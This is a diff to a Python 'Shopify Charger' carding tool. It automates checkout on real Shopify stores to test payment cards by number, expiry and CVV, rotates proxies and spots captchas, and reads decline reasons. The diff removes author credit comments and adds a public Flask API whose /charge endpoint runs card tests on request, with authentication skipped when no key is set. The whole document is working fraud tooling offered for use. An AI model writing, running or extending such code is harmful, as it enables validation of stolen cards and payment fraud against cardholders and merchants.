@@ -117,7 +117,6 @@ def parse_proxy(proxy_str):
 def is_captcha_required(response_text):
     if not response_text:
         return False
-    # Coded by @aiojames
     indicators = [
         'CAPTCHA_REQUIRED',
         '"code":"CAPTCHA_REQUIRED"',
@@ -337,7 +336,6 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             attempt_token = attempt_token_match.group(1) if attempt_token_match else checkout_url.split('/')[-1].split('?')[0]
 
             sst = response.headers.get('X-Checkout-One-Session-Token') or response.headers.get('x-checkout-one-session-token')
-            # Coded by @aiojames
             text = await response.text()
             if not sst:
                 sst = extract_between(text, 'name="serialized-sessionToken" content="&quot;', '&quot;')
@@ -374,7 +372,6 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 price_match = re.search(r'"price":\s*"([\d.]+)"', text)
                 subtotal = price_match.group(1) if price_match else "0.01"
 
-            # Extract build ID (commitSha), source token, and identification signature
             unescaped_text = text.replace('&quot;', '"').replace('&amp;', '&').replace('&#39;', "'")
             
             build_id = None
@@ -394,7 +391,6 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             if not sst:
                 return False, "Failed to get session token", gateway, total_price, currency
             
-            # Add checkout-specific headers for modern Shopify (matching working Go implementation)
             headers.update({
                 'shopify-checkout-client': 'checkout-web/1.0',
                 'shopify-checkout-source': f'id="{attempt_token}", type="cn"',
@@ -679,7 +675,6 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 "payment_session_scope": urlparse(url).netloc
             }
             
-            # Coded by @aiojames
             vault_headers = {
                 'Content-Type': 'application/json',
                 'Accept': 'application/json',
@@ -887,7 +882,6 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                             code = error.get('code', '')
                             localized_msg = error.get('localizedMessage', '')
                             non_localized_msg = error.get('nonLocalizedMessage', '')
-                            # If code is generic, prefer the localized/non-localized message for the real decline reason
                             if code in ('GENERIC_ERROR', 'PAYMENT_FAILED', ''):
                                 detail = localized_msg or non_localized_msg
                                 if detail:
@@ -945,11 +939,9 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                             if error_type == 'PaymentFailed':
                                 code = error.get('code', '')
                                 msg = error.get('messageUntranslated', '')
-                                # If code is generic, prefer the untranslated message for the real decline reason
                                 if code in ('GENERIC_ERROR', 'PAYMENT_FAILED', '') and msg:
                                     return True, msg, gateway, total_price, currency
                                 return True, code if code else 'PAYMENT_FAILED', gateway, total_price, currency
-                            # Handle other error types
                             code = error.get('code') or error_type or 'UNKNOWN_ERROR'
                             return True, code, gateway, total_price, currency
                         elif typename == 'ActionRequiredReceipt':
@@ -1016,7 +1008,6 @@ async def process_card_async(cc, mes, ano, cvv, site_url, variant_id=None, proxy
     return await process_card(cc, mes, ano, cvv, site_url, variant_id, proxy_str)
 
 
-
 async def autoshopify_charge(card, site_url, proxy_list=None, speed=1.0):
     """Async wrapper for Shopify checkout charge."""
     try:
@@ -1052,7 +1043,6 @@ async def check_site(site_url, proxy_str=None):
     timeout = aiohttp.ClientTimeout(total=15)
 
     async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
-        # Check products.json
         try:
             async with session.get(f"{site_url}/products.json", proxy=proxy, timeout=10) as resp:
                 text = await resp.text()
@@ -1070,7 +1060,6 @@ async def check_site(site_url, proxy_str=None):
         except Exception as e:
             return False, False, False, f"Connection error: {str(e)[:50]}"
 
-        # Check checkout for login requirement and payment methods
         try:
             headers = {
                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
@@ -1086,3 +1075,131 @@ async def check_site(site_url, proxy_str=None):
                 return True, False, False, "No checkout session"
         except Exception as e:
             return True, False, False, f"Checkout error: {str(e)[:50]}"
+
+
+# ==========================================================================
+# FLASK PUBLIC API
+# ==========================================================================
+
+app = Flask(__name__)
+
+API_KEY = os.environ.get("API_KEY", "").strip()
+
+
+def _auth_ok(req):
+    if not API_KEY:
+        return True
+    key = req.headers.get("X-API-Key") or req.args.get("key")
+    return key == API_KEY
+
+
+def _run_async(coro):
+    """Run async coroutine from sync Flask view."""
+    import concurrent.futures
+    try:
+        loop = asyncio.get_event_loop()
+        if loop.is_running():
+            with concurrent.futures.ThreadPoolExecutor(max_workers=1) as pool:
+                return pool.submit(asyncio.run, coro).result()
+        return loop.run_until_complete(coro)
+    except RuntimeError:
+        return asyncio.run(coro)
+
+
+@app.route("/", methods=["GET"])
+def _root():
+    return jsonify({
+        "service": "Shopify Charger API",
+        "status": "online",
+        "auth_required": bool(API_KEY),
+        "endpoints": {
+            "GET  /health": "health check",
+            "POST /check": "check site (json: {site, proxy?})",
+            "POST /products": "cheapest product (json: {site, proxy?})",
+            "POST /charge": "charge (json: {card, site, proxies?, speed?})",
+        }
+    })
+
+
+@app.route("/health", methods=["GET"])
+def _health():
+    return jsonify({"status": "healthy"}), 200
+
+
+@app.route("/check", methods=["POST"])
+def _check():
+    if not _auth_ok(request):
+        return jsonify({"error": "unauthorized"}), 401
+
+    data = request.get_json(silent=True) or {}
+    site = data.get("site")
+    proxy = data.get("proxy")
+    if not site:
+        return jsonify({"error": "missing 'site'"}), 400
+
+    try:
+        is_shopify, has_payment, requires_login, msg = _run_async(check_site(site, proxy))
+        return jsonify({
+            "site": site,
+            "shopify": is_shopify,
+            "has_payment": has_payment,
+            "requires_login": requires_login,
+            "message": msg,
+        })
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+
+@app.route("/products", methods=["POST"])
+def _products():
+    if not _auth_ok(request):
+        return jsonify({"error": "unauthorized"}), 401
+
+    data = request.get_json(silent=True) or {}
+    site = data.get("site")
+    proxy = data.get("proxy")
+    if not site:
+        return jsonify({"error": "missing 'site'"}), 400
+
+    try:
+        result = _run_async(fetch_products(site, proxy))
+        if isinstance(result, tuple) and result[0] is False:
+            return jsonify({"success": False, "error": result[1]}), 400
+        return jsonify({"success": True, "product": result})
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+
+@app.route("/charge", methods=["POST"])
+def _charge():
+    if not _auth_ok(request):
+        return jsonify({"error": "unauthorized"}), 401
+
+    data = request.get_json(silent=True) or {}
+    card = data.get("card")
+    site = data.get("site")
+    proxies = data.get("proxies") or []
+    speed = float(data.get("speed", 1.0))
+
+    if not card or not site:
+        return jsonify({"error": "missing 'card' or 'site'"}), 400
+
+    if isinstance(proxies, str):
+        proxies = [proxies]
+    if not isinstance(proxies, list):
+        proxies = []
+
+    try:
+        result = _run_async(autoshopify_charge(card, site, proxies, speed))
+        return jsonify({"site": site, "result": result})
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+
+# ==========================================================================
+# STARTUP (Railway / local)
+# ==========================================================================
+
+if __name__ == "__main__":
+    port = int(os.environ.get("PORT", 8080))
+    app.run(host="0.0.0.0", port=port)
